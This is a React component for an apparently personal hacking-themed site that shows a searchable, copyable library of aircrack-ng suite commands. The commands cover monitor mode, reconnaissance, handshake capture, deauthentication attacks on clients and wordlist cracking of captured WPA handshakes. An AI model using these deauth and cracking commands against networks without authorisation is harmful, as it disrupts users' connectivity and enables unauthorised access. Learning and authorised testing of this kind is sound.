
import React, { useState } from 'react';
import { Search, Copy, Check } from 'lucide-react';
import { toast } from "@/hooks/use-toast";

const CommandLibrary = () => {
  const [searchTerm, setSearchTerm] = useState('');
  const [filter, setFilter] = useState('all');
  const [copied, setCopied] = useState<string | null>(null);
  
  const commands = [
    {
      id: 1,
      command: "sudo airmon-ng start wlan0",
      description: "Starts monitor mode on wireless interface wlan0",
      category: "monitor"
    },
    {
      id: 2,
      command: "sudo airodump-ng wlan0mon",
      description: "Lists all available access points and clients",
      category: "recon"
    },
    {
      id: 3,
      command: "sudo airodump-ng -c [CHANNEL] --bssid [MAC] -w [FILENAME] wlan0mon",
      description: "Captures packets from specific access point on specified channel",
      category: "capture"
    },
    {
      id: 4,
      command: "sudo aireplay-ng -0 10 -a [TARGET_MAC] -c [CLIENT_MAC] wlan0mon",
      description: "Sends deauthentication packets to client to force reconnection",
      category: "attack"
    },
    {
      id: 5,
      command: "sudo aircrack-ng -w wordlist.txt [FILENAME]-01.cap",
      description: "Attempts to crack captured handshake using wordlist",
      category: "crack"
    },
    {
      id: 6,
      command: "sudo ifconfig wlan0 down",
      description: "Disables wireless interface",
      category: "setup"
    },
    {
      id: 7,
      command: "sudo iwconfig wlan0 mode monitor",
      description: "Sets wireless interface to monitor mode manually",
      category: "setup"
    },
    {
      id: 8,
      command: "sudo ifconfig wlan0 up",
      description: "Enables wireless interface",
      category: "setup"
    }
  ];

  const copyToClipboard = (command: string, id: number) => {
    navigator.clipboard.writeText(command);
    setCopied(id.toString());
    toast({
      title: "Command copied!",
      description: "Command copied to clipboard"
    });
    
    setTimeout(() => {
      setCopied(null);
    }, 2000);
  };

  const filteredCommands = commands
    .filter(cmd => 
      cmd.command.toLowerCase().includes(searchTerm.toLowerCase()) || 
      cmd.description.toLowerCase().includes(searchTerm.toLowerCase())
    )
    .filter(cmd => filter === 'all' || cmd.category === filter);

  return (
    <section id="command-library" className="py-20">
      <div className="section-container">
        <div className="text-center mb-12">
          <h2 className="text-3xl md:text-4xl font-bold mb-4">Command Library</h2>
          <p className="text-gray-300 max-w-2xl mx-auto">
            A searchable collection of essential Kali Linux and Wi-Fi hacking commands used by ALX-17.
          </p>
          <div className="w-24 h-1 bg-hack-green mx-auto mt-4"></div>
        </div>

        <div className="flex flex-col md:flex-row gap-4 mb-8">
          <div className="relative flex-1">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" />
            <input
              type="text"
              placeholder="Search commands or descriptions..."
              className="w-full bg-hack-gray border border-gray-700 rounded-md py-3 pl-10 pr-4 text-white"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>
          
          <select
            className="bg-hack-gray border border-gray-700 rounded-md py-3 px-4 text-white"
            value={filter}
            onChange={(e) => setFilter(e.target.value)}
          >
            <option value="all">All Categories</option>
            <option value="setup">Setup</option>
            <option value="monitor">Monitor Mode</option>
            <option value="recon">Reconnaissance</option>
            <option value="capture">Capture</option>
            <option value="attack">Attack</option>
            <option value="crack">Password Cracking</option>
          </select>
        </div>

        <div className="space-y-4">
          {filteredCommands.length > 0 ? (
            filteredCommands.map((cmd) => (
              <div key={cmd.id} className="card p-4 flex flex-col md:flex-row justify-between items-start md:items-center">
                <div>
                  <pre className="text-hack-green font-mono mb-2">{cmd.command}</pre>
                  <p className="text-gray-300">{cmd.description}</p>
                  <span className="inline-block bg-hack-dark text-xs text-hack-green px-2 py-1 rounded mt-2">
                    {cmd.category}
                  </span>
                </div>
                <button 
                  className="mt-3 md:mt-0 flex items-center gap-1 bg-hack-dark hover:bg-gray-800 px-3 py-1 rounded text-sm"
                  onClick={() => copyToClipboard(cmd.command, cmd.id)}
                >
                  {copied === cmd.id.toString() ? (
                    <>
                      <Check className="h-4 w-4 text-hack-green" />
                      <span>Copied</span>
                    </>
                  ) : (
                    <>
                      <Copy className="h-4 w-4" />
                      <span>Copy</span>
                    </>
                  )}
                </button>
              </div>
            ))
          ) : (
            <div className="text-center py-10">
              <p className="text-gray-400">No commands found. Try a different search term.</p>
            </div>
          )}
        </div>
      </div>
    </section>
  );
};

export default CommandLibrary;
